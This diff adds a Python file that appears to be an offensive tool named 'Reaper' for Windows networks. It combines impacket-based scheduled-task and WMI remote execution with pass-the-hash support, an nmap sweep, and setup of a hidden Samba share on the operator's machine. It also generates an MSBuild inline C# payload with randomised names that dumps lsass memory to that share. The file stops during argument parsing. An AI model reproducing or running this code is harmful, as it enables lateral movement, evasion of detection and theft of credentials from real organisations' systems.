@@ -1,0 +1,1018 @@
+from __future__ import division
+from __future__ import print_function
+import sys
+import os
+import cmd
+import time
+import nmap
+import ntpath
+import socket
+import random
+import string
+import logging
+import argparse
+import threading
+import subprocess
+import netifaces as ni
+import concurrent.futures
+from base64 import b64encode
+from datetime import datetime
+
+from six import PY2
+from impacket import version
+from impacket import smbserver
+from impacket.examples import logger
+from impacket.krb5.keytab import Keytab
+from impacket.dcerpc.v5.dcom import wmi
+from impacket.dcerpc.v5.dtypes import NULL
+from impacket.dcerpc.v5 import tsch, transport
+from impacket.examples.utils import parse_target
+from impacket.ntlm import compute_lmhash, compute_nthash
+from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
+
+
+OUTPUT_FILENAME = '__' + str(time.time())
+CODEC = sys.stdout.encoding
+timestamp = str(datetime.fromtimestamp(time.time())).replace(' ', '_')
+
+###################COLORS#################
+color_RED = '\033[91m'
+color_GRE = '\033[92m'
+color_YELL = '\033[93m'
+color_BLU = '\033[94m'
+color_PURP = '\033[35m'
+color_reset = '\033[0m'
+green_plus = "{}[+]{}".format(color_GRE, color_reset)
+
+reaper_banner = """
+ ██{}▓{}      ██████  ▄▄▄       ██▀███  {}▓{}█████ ▄▄▄       ██{}▓{}███  {}▓{}█████  ██▀███  
+{}▓{}██{}▒{}    {}▒{}██    {}▒ ▒{}████▄    {}▓{}██ {}▒{} ██{}▒▓{}█   ▀{}▒{}████▄    {}▓{}██{}░{}  ██{}▒▓{}█   ▀ {}▓{}██ {}▒{} ██{}▒{}
+{}▒{}██{}░    ░ ▓{}██▄   {}▒{}██  ▀█▄  {}▓{}██ {}░{}▄█ {}▒▒{}███  {}▒{}██  ▀█▄  {}▓{}██{}░{} ██{}▓▒▒{}███   {}▓{}██ {}░{}▄█ {}▒{}
+{}▒{}██{}░      ▒{}   ██{}▒░{}██▄▄▄▄██ {}▒{}██▀▀█▄  {}▒▓{}█  ▄{}░{}██▄▄▄▄██ {}▒{}██▄█{}▓▒ ▒▒▓{}█  ▄ {}▒{}██▀▀█▄  
+{}░{}██████{}▒▒{}██████{}▒▒ ▓{}█   {}▓{}██{}▒░{}██{}▓ ▒{}██{}▒░▒{}████{}▒▓{}█   {}▓{}██{}▒▒{}██{}▒ ░  ░░▒{}████{}▒░{}██{}▓ ▒{}██{}▒
+░ ▒░▓  ░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒{}█{}░░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒{}█{}░▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
+░ ░ ▒  ░░ ░▒  ░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░
+  ░ ░   ░  ░  ░    ░   ▒     ░░   ░    ░    ░   ▒   ░░          ░     ░░   ░ 
+    ░  ░      ░        ░  ░   ░        ░  ░     ░  ░            ░  ░   ░     {}
+                                                                             
+""".format(color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset)
+
+################################################# START OF ATEXEC #########################################################################
+class TSCH_EXEC:
+    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None,
+                 command=None, sessionId=None, silentCommand=False):
+        self.__username = username
+        self.__password = password
+        self.__domain = domain
+        self.__lmhash = ''
+        self.__nthash = ''
+        self.__aesKey = aesKey
+        self.__doKerberos = doKerberos
+        self.__kdcHost = kdcHost
+        self.__command = command
+        self.__silentCommand = silentCommand
+        self.sessionId = sessionId
+
+        if hashes is not None:
+            self.__lmhash, self.__nthash = hashes.split(':')
+
+    def play(self, addr):
+        stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % addr
+        rpctransport = transport.DCERPCTransportFactory(stringbinding)
+
+        if hasattr(rpctransport, 'set_credentials'):
+            # This method exists only for selected protocol sequences.
+            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                                         self.__aesKey)
+            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
+        try:
+            self.doStuff(rpctransport, addr)
+        except Exception as e:
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
+            logging.error('{}: {}'.format(addr, e))
+            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >=0:
+                logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')
+
+    def doStuff(self, rpctransport, addr):
+        def output_callback(data):
+            try:
+                if logging.getLogger().level == logging.DEBUG:
+                    print('{}: {}'.format(addr, data.decode(CODEC)))
+            except UnicodeDecodeError:
+                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
+                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute atexec.py '
+                              'again with -codec and the corresponding codec')
+                print(data.decode(CODEC, errors='replace'))
+
+        def xml_escape(data):
+            replace_table = {
+                 "&": "&amp;",
+                 '"': "&quot;",
+                 "'": "&apos;",
+                 ">": "&gt;",
+                 "<": "&lt;",
+                 }
+            return ''.join(replace_table.get(c, c) for c in data)
+
+        def cmd_split(cmdline):
+            cmdline = cmdline.split(" ", 1)
+            cmd = cmdline[0]
+            args = cmdline[1] if len(cmdline) > 1 else ''
+
+            return [cmd, args]
+
+        dce = rpctransport.get_dce_rpc()
+
+        dce.set_credentials(*rpctransport.get_credentials())
+        if self.__doKerberos is True:
+            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+        dce.connect()
+        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+        dce.bind(tsch.MSRPC_UUID_TSCHS)
+        tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
+        tmpFileName = tmpName + '.tmp'
+
+        if self.sessionId is not None:
+            cmd, args = cmd_split(self.__command)
+        else:
+            cmd = "cmd.exe"
+            args = "/C %s > %%windir%%\\Temp\\%s 2>&1" % (self.__command, tmpFileName)
+
+        xml = """<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers>
+    <CalendarTrigger>
+      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
+      <Enabled>true</Enabled>
+      <ScheduleByDay>
+        <DaysInterval>1</DaysInterval>
+      </ScheduleByDay>
+    </CalendarTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="LocalSystem">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="LocalSystem">
+    <Exec>
+      <Command>%s</Command>
+      <Arguments>%s</Arguments>
+    </Exec>
+  </Actions>
+</Task>
+        """ % ((xml_escape(cmd) if self.__silentCommand is False else self.__command.split()[0]),
+            (xml_escape(args) if self.__silentCommand is False else " ".join(self.__command.split()[1:])))
+        taskCreated = False
+        try:
+            if logging.getLogger().level == logging.DEBUG:
+                logging.info('{}: Creating task \\{}'.format(addr, tmpName))
+            tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
+            taskCreated = True
+
+            if logging.getLogger().level == logging.DEBUG:
+                logging.info('{}: Running task \\{}'.format(addr, tmpName))
+            done = False
+
+            if self.sessionId is None:
+                tsch.hSchRpcRun(dce, '\\%s' % tmpName)
+            else:
+                try:
+                    tsch.hSchRpcRun(dce, '\\%s' % tmpName, flags=tsch.TASK_RUN_USE_SESSION_ID, sessionId=self.sessionId)
+                except Exception as e:
+                    if str(e).find('ERROR_FILE_NOT_FOUND') >= 0 or str(e).find('E_INVALIDARG') >= 0 :
+                        logging.info('The specified session doesn\'t exist!')
+                        done = True
+                    else:
+                        raise
+
+            while not done:
+                logging.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
+                resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % tmpName)
+                if resp['pLastRuntime']['wYear'] != 0:
+                    done = True
+                else:
+                    time.sleep(2)
+            if logging.getLogger().level == logging.DEBUG:
+                logging.info('{}: Deleting task \\{}'.format(addr, tmpName))
+            tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
+            taskCreated = False
+        except tsch.DCERPCSessionError as e:
+            logging.error(e)
+            e.get_packet().dump()
+        finally:
+            if taskCreated is True:
+                tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
+
+        if self.sessionId is not None:
+            dce.disconnect()
+            return
+
+        if self.__silentCommand:
+            dce.disconnect()
+            return
+
+        smbConnection = rpctransport.get_smb_connection()
+        waitOnce = True
+        while True:
+            try:
+                if logging.getLogger().level == logging.DEBUG:
+                    logging.info('{}: Attempting to read ADMIN$\\Temp\\{}'.format(addr, tmpFileName))
+                smbConnection.getFile('ADMIN$', 'Temp\\%s' % tmpFileName, output_callback)
+                break
+            except Exception as e:
+                if str(e).find('SHARING') > 0:
+                    time.sleep(3)
+                elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
+                    if waitOnce is True:
+                        # We're giving it the chance to flush the file before giving up
+                        time.sleep(3)
+                        waitOnce = False
+                    else:
+                        raise
+                else:
+                    raise
+        if logging.getLogger().level == logging.DEBUG:
+            logging.debug('{}: Deleting file ADMIN$\\Temp\\{}'.format(addr, tmpFileName))
+        smbConnection.deleteFile('ADMIN$', 'Temp\\%s' % tmpFileName)
+
+        dce.disconnect()
+
+########################################## END OF ATEXEC ############################################################################
+
+########################################## START OF WMIEXEC #########################################################################
+class WMIEXEC:
+    def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, share=None,
+                 noOutput=False, doKerberos=False, kdcHost=None, shell_type=None):
+        self.__command = command
+        self.__username = username
+        self.__password = password
+        self.__domain = domain
+        self.__lmhash = ''
+        self.__nthash = ''
+        self.__aesKey = aesKey
+        self.__share = share
+        self.__noOutput = noOutput
+        self.__doKerberos = doKerberos
+        self.__kdcHost = kdcHost
+        self.__shell_type = shell_type
+        self.shell = None
+        if hashes is not None:
+            self.__lmhash, self.__nthash = hashes.split(':')
+
+    def run(self, addr, silentCommand=False):
+        if self.__noOutput is False and silentCommand is False:
+            smbConnection = SMBConnection(addr, addr)
+            if self.__doKerberos is False:
+                smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+            else:
+                smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
+                                            self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)
+
+            dialect = smbConnection.getDialect()
+            if logging.getLogger().level == logging.DEBUG:
+                if dialect == SMB_DIALECT:
+                    logging.info("SMBv1 dialect used")
+                elif dialect == SMB2_DIALECT_002:
+                    logging.info("SMBv2.0 dialect used")
+                elif dialect == SMB2_DIALECT_21:
+                    logging.info("SMBv2.1 dialect used")
+                else:
+                    logging.info("SMBv3.0 dialect used")
+        else:
+            smbConnection = None
+
+        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
+        try:
+            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
+            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
+            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
+            iWbemLevel1Login.RemRelease()
+
+            win32Process, _ = iWbemServices.GetObject('Win32_Process')
+
+            self.shell = RemoteShell(self.__share, win32Process, smbConnection, self.__shell_type, silentCommand)
+            if self.__command != ' ':
+                self.shell.onecmd(self.__command)
+            else:
+                self.shell.cmdloop()
+        except  (Exception, KeyboardInterrupt) as e:
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
+            logging.error(str(e))
+            if smbConnection is not None:
+                smbConnection.logoff()
+            dcom.disconnect()
+            sys.stdout.flush()
+            pass
+
+        if smbConnection is not None:
+            smbConnection.logoff()
+        dcom.disconnect()
+
+
+class RemoteShell(cmd.Cmd):
+    def __init__(self, share, win32Process, smbConnection, shell_type, silentCommand=False):
+        cmd.Cmd.__init__(self)
+        self.__share = share
+        self.__output = '\\' + OUTPUT_FILENAME
+        self.__outputBuffer = str('')
+        self.__shell = 'cmd.exe /Q /c '
+        self.__shell_type = shell_type
+        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
+        self.__win32Process = win32Process
+        self.__transferClient = smbConnection
+        self.__silentCommand = silentCommand
+        self.__pwd = str('C:\\')
+        self.__noOutput = False
+        self.intro = '[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands'
+
+        # We don't wanna deal with timeouts from now on.
+        if self.__transferClient is not None:
+            self.__transferClient.setTimeout(30000)
+            self.do_cd('\\')
+        else:
+            self.__noOutput = True
+
+        # If the user wants to just execute a command without cmd.exe, set raw command and set no output
+        if self.__silentCommand is True:
+            self.__shell = ''
+
+    def do_shell(self, s):
+        os.system(s)
+
+    def do_help(self, line):
+        print("""
+ lcd {path}                 - changes the current local directory to {path}
+ exit                       - terminates the server process (and this session)
+ lput {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
+ lget {file}                 - downloads pathname to the current local dir
+ ! {cmd}                    - executes a local shell cmd
+""")
+
+    def do_lcd(self, s):
+        if s == '':
+            print(os.getcwd())
+        else:
+            try:
+                os.chdir(s)
+            except Exception as e:
+                logging.error(str(e))
+
+    def do_lget(self, src_path):
+
+        try:
+            import ntpath
+            newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
+            drive, tail = ntpath.splitdrive(newPath)
+            filename = ntpath.basename(tail)
+            fh = open(filename, 'wb')
+            logging.info("Downloading %s\\%s" % (drive, tail))
+            self.__transferClient.getFile(drive[:-1] + '$', tail, fh.write)
+            fh.close()
+
+        except Exception as e:
+            logging.error(str(e))
+
+            if os.path.exists(filename):
+                os.remove(filename)
+
+    def do_lput(self, s):
+        try:
+            params = s.split(' ')
+            if len(params) > 1:
+                src_path = params[0]
+                dst_path = params[1]
+            elif len(params) == 1:
+                src_path = params[0]
+                dst_path = ''
+
+            src_file = os.path.basename(src_path)
+            fh = open(src_path, 'rb')
+            dst_path = dst_path.replace('/', '\\')
+            import ntpath
+            pathname = ntpath.join(ntpath.join(self.__pwd, dst_path), src_file)
+            drive, tail = ntpath.splitdrive(pathname)
+            logging.info("Uploading %s to %s" % (src_file, pathname))
+            self.__transferClient.putFile(drive[:-1] + '$', tail, fh.read)
+            fh.close()
+        except Exception as e:
+            logging.critical(str(e))
+            pass
+
+    def do_exit(self, s):
+        return True
+
+    def do_EOF(self, s):
+        print()
+        return self.do_exit(s)
+
+    def emptyline(self):
+        return False
+
+    def do_cd(self, s):
+        self.execute_remote('cd ' + s)
+        if len(self.__outputBuffer.strip('\r\n')) > 0:
+            print(self.__outputBuffer)
+            self.__outputBuffer = ''
+        else:
+            if PY2:
+                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s.decode(sys.stdin.encoding)))
+            else:
+                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
+            self.execute_remote('cd ')
+            self.__pwd = self.__outputBuffer.strip('\r\n')
+            self.prompt = (self.__pwd + '>')
+            if self.__shell_type == 'powershell':
+                self.prompt = 'PS ' + self.prompt + ' '
+            self.__outputBuffer = ''
+
+    def default(self, line):
+        # Let's try to guess if the user is trying to change drive
+        if len(line) == 2 and line[1] == ':':
+            # Execute the command and see if the drive is valid
+            self.execute_remote(line)
+            if len(self.__outputBuffer.strip('\r\n')) > 0:
+                # Something went wrong
+                print(self.__outputBuffer)
+                self.__outputBuffer = ''
+            else:
+                # Drive valid, now we should get the current path
+                self.__pwd = line
+                self.execute_remote('cd ')
+                self.__pwd = self.__outputBuffer.strip('\r\n')
+                self.prompt = (self.__pwd + '>')
+                self.__outputBuffer = ''
+        else:
+            if line != '':
+                self.send_data(line)
+
+    def get_output(self):
+        def output_callback(data):
+            try:
+                self.__outputBuffer += data.decode(CODEC)
+            except UnicodeDecodeError:
+                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
+                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute wmiexec.py '
+                              'again with -codec and the corresponding codec')
+                self.__outputBuffer += data.decode(CODEC, errors='replace')
+
+        if self.__noOutput is True:
+            self.__outputBuffer = ''
+            return
+
+        while True:
+            try:
+                self.__transferClient.getFile(self.__share, self.__output, output_callback)
+                break
+            except Exception as e:
+                if str(e).find('STATUS_SHARING_VIOLATION') >= 0:
+                    # Output not finished, let's wait
+                    time.sleep(1)
+                    pass
+                elif str(e).find('Broken') >= 0:
+                    # The SMB Connection might have timed out, let's try reconnecting
+                    logging.debug('Connection broken, trying to recreate it')
+                    self.__transferClient.reconnect()
+                    return self.get_output()
+        self.__transferClient.deleteFile(self.__share, self.__output)
+
+    def execute_remote(self, data, shell_type='cmd'):
+        if shell_type == 'powershell':
+            data = '$ProgressPreference="SilentlyContinue";' + data
+            data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
+
+        command = self.__shell + data
+
+        if self.__noOutput is False:
+            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output + ' 2>&1'
+        if PY2:
+            self.__win32Process.Create(command.decode(sys.stdin.encoding), self.__pwd, None)
+        else:
+            self.__win32Process.Create(command, self.__pwd, None)
+        self.get_output()
+
+    def send_data(self, data):
+        self.execute_remote(data, self.__shell_type)
+        if logging.getLogger().level == logging.DEBUG:
+            print(self.__outputBuffer)
+        self.__outputBuffer = ''
+
+
+class AuthFileSyntaxError(Exception):
+    '''raised by load_smbclient_auth_file if it encounters a syntax error
+    while loading the smbclient-style authentication file.'''
+
+    def __init__(self, path, lineno, reason):
+        self.path = path
+        self.lineno = lineno
+        self.reason = reason
+
+    def __str__(self):
+        return 'Syntax error in auth file %s line %d: %s' % (
+            self.path, self.lineno, self.reason)
+
+
+def load_smbclient_auth_file(path):
+    '''Load credentials from an smbclient-style authentication file (used by
+    smbclient, mount.cifs and others).  returns (domain, username, password)
+    or raises AuthFileSyntaxError or any I/O exceptions.'''
+
+    lineno = 0
+    domain = None
+    username = None
+    password = None
+    for line in open(path):
+        lineno += 1
+
+        line = line.strip()
+
+        if line.startswith('#') or line == '':
+            continue
+
+        parts = line.split('=', 1)
+        if len(parts) != 2:
+            raise AuthFileSyntaxError(path, lineno, 'No "=" present in line')
+
+        (k, v) = (parts[0].strip(), parts[1].strip())
+
+        if k == 'username':
+            username = v
+        elif k == 'password':
+            password = v
+        elif k == 'domain':
+            domain = v
+        else:
+            raise AuthFileSyntaxError(path, lineno, 'Unknown option %s' % repr(k))
+
+    return (domain, username, password)
+
+############################################################################### END OF WMIEXEC#####################################################
+
+def do_ip(inpu): # check if the inputted ips are up so we dont scan thigns we dont need to
+    scanner = nmap.PortScanner()
+    if os.path.isfile(inpu):  # if its in a file the arguments are different
+        scanner.scan(arguments='-n -sn -iL {}'.format(inpu))
+    else:
+        scanner.scan(hosts=inpu, arguments='-n -sn')
+    uphosts = scanner.all_hosts()
+
+    return uphosts
+
+def gen_payload(share_name, payload_name, drive_letter):
+    targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    taskname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    MiniDumpWithFullMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    MiniDumpWithHandleData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    MiniDumpWithThreadInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    MiniDumpWithTokenInformation = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    filename = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    dumpTyp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    prochandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    procid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    Dump = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    GetPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    processes = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    id = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    process = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    IsAdministrator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+    p = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
+
+    xml_payload = r"""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+<!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
+	<Target Name="%s">
+            <%s /> 
+          </Target>
+          <UsingTask
+            TaskName="%s"
+            TaskFactory="CodeTaskFactory"
+            AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+            <Task>
+
+              <Code Type="Class" Language="cs">
+              <![CDATA[
+using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;
+public class %s : Task, ITask {
+		public enum Typ : uint
+        {
+            %s = 0x00000001,
+            %s = 0x00000002,
+            %s = 0x00000004,
+            %s = 0x00001000,
+            %s = 0x00040000,
+        };
+
+        [System.Runtime.InteropServices.DllImport("dbghelp.dll",
+              EntryPoint = "MiniDumpWriteDump",
+              CallingConvention = CallingConvention.StdCall,
+              CharSet = CharSet.Unicode,
+              ExactSpelling = true, SetLastError = true)]
+        static extern bool MiniDumpWriteDump(
+              IntPtr hProcess,
+              uint processId,
+              IntPtr hFile,
+              uint dumpType,
+              IntPtr expParam,
+              IntPtr userStreamParam,
+              IntPtr callbackParam);
+
+        public static bool %s(string %s, Typ %s, IntPtr %s, uint %s)
+        {
+            using (var fs = new System.IO.FileStream(%s, System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))
+            {
+                bool bRet = MiniDumpWriteDump(
+                  %s,
+                  %s,
+                  fs.SafeFileHandle.DangerousGetHandle(),
+                  (uint)%s,
+                  IntPtr.Zero,
+                  IntPtr.Zero,
+                  IntPtr.Zero);
+                if (!bRet)
+                {
+                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
+                }
+                return bRet;
+            }
+        }
+
+        public static int %s() {
+            var %s = System.Diagnostics.Process.GetProcessesByName("lsass");
+            var %s = 0;
+            foreach (var %s in %s)
+            {
+                %s = %s.Id;
+            }
+
+            return %s;
+        }
+
+        public static bool %s()
+        {
+            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
+                      .IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+        public override bool Execute()
+		{
+            if (%s())
+            {
+                string filePath = "%s:\\" + System.Net.Dns.GetHostName() + ".dmp";
+                Process %s = Process.GetProcessById(%s());
+                %s(filePath, (Typ.%s | Typ.%s | Typ.%s | Typ.%s | Typ.%s), %s.Handle, (uint)%s.Id);
+
+            }
+			System.Diagnostics.Process.Start("CMD.exe", "/C net use %s: /delete /yes");
+			return true;
+        }}
+                                ]]>
+                        </Code>
+                </Task>
+        </UsingTask>
+</Project>""" % (targetname, taskname, taskname, taskname, MiniDumpWithDataSegs, MiniDumpWithFullMemory, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, Dump, filename, dumpTyp, prochandle, procid, filename, prochandle, procid, dumpTyp, GetPID, processes, id, process, processes, id, process, id, IsAdministrator, IsAdministrator, drive_letter, p, GetPID, Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p, drive_letter)
+
+    with open('/var/tmp/{}/{}.xml'.format(share_name, payload_name), 'w') as f:
+        f.write(xml_payload)
+        f.close()
+
+def setup_share():
+    share_name = ''.join(random.choices(string.ascii_lowercase, k=20))
+    share_user = ''.join(random.choices(string.ascii_lowercase, k=10))
+    share_pass = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=35))
+    payload_name = ''.join(random.choices(string.ascii_lowercase, k=10))
+    share_group = ''.join(random.choices(string.ascii_lowercase, k=10))
+
+    print("\n[Generating share]")
+    # making the directory
+    print("{} Creating the share folder".format(green_plus))
+    os.system("sudo mkdir /var/tmp/" + share_name)
+
+    # smb.conf edits
+    data = """[{}]
+    path = /var/tmp/{}
+    public = no
+    force user = {}
+    force group = {}
+    browseable = yes
+    create mask = 0664
+    force create mode = 0664
+    directory mask = 0775
+    force directory mode = 0775
+    read only = no
+    comment = The share
+    """.format(share_name, share_name, share_user, share_group)
+
+
+
+    # copy old smb.conf file so its safe
+    print("{} Backing up the smb.conf file".format(green_plus))
+    os.system("sudo cp /etc/samba/smb.conf " + os.getcwd() + "/")
+    print("{} Making modifications".format(green_plus))
+    with open('/etc/samba/smb.conf', 'a') as f:
+        f.write(data)
+        f.close()
+
+    # create the user for the share
+    # generate the group
+    print("{} Creating the group".format(green_plus))
+    os.system("sudo groupadd --system " + share_group)
+    # make the user
+    print("{} Creating the user".format(green_plus))
+    os.system("sudo useradd --system --no-create-home --group " + share_group + " -s /bin/false " + share_user)
+    # give the user access to the share folder
+    print("{} Giving the user rights".format(green_plus))
+    os.system("sudo chown -R " + share_user + ":" + share_group + " /var/tmp/" + share_name)
+    # expand access to the group
+    print("{} Giving the group rights".format(green_plus))
+    os.system("sudo chmod -R g+w /var/tmp/" + share_name)
+    # create the smbusers password
+    print("{} Editing the SMB password".format(green_plus))
+    proc = subprocess.Popen(['sudo', 'smbpasswd', '-a', '-s', share_user], stdin=subprocess.PIPE)
+    proc.communicate(input=share_pass.encode() + '\n'.encode() + share_pass.encode() + '\n'.encode())
+    # restart the smb service
+    print("{}[+]{} Restarting the SMB service".format(color_BLU, color_reset))
+    os.system("sudo systemctl restart smbd")
+
+    return share_name, share_user, share_pass, payload_name, share_group
+
+def mt_execute(ip): # multithreading requires a function
+    try:
+        if options.method == 'wmiexec':
+            executer = WMIEXEC(command, username, password, domain, options.hashes, options.aesKey, options.share, False, options.k, options.dc_ip, 'cmd')
+            executer.run(ip, False)
+        elif options.method == 'atexec':
+            atsvc_exec = TSCH_EXEC(username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip, command, None, False)
+            atsvc_exec.play(ip)
+    except Exception as e:
+        if logging.getLogger().level == logging.DEBUG:
+            import traceback
+
+            traceback.print_exc()
+        logging.error(str(e))
+        pass
+
+# Process command-line arguments.
+if __name__ == '__main__':
+    # quick checks to see if were good
+    if sys.platform != "linux":
+        print("[!] This program is Linux only")
+        exit(1)
+
+    if (os.path.isdir(os.getcwd() + "/loot") == False):
+        os.makedirs(os.getcwd() + "/loot")
+
+    print(reaper_banner)
+    print(version.BANNER)
+
+    parser = argparse.ArgumentParser(add_help=True, description="")
+    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName, address, range, cidr>')
+    parser.add_argument('-share', action='store', default='ADMIN$', help='share where the output will be grabbed from '
+                                                                         '(default ADMIN$)')
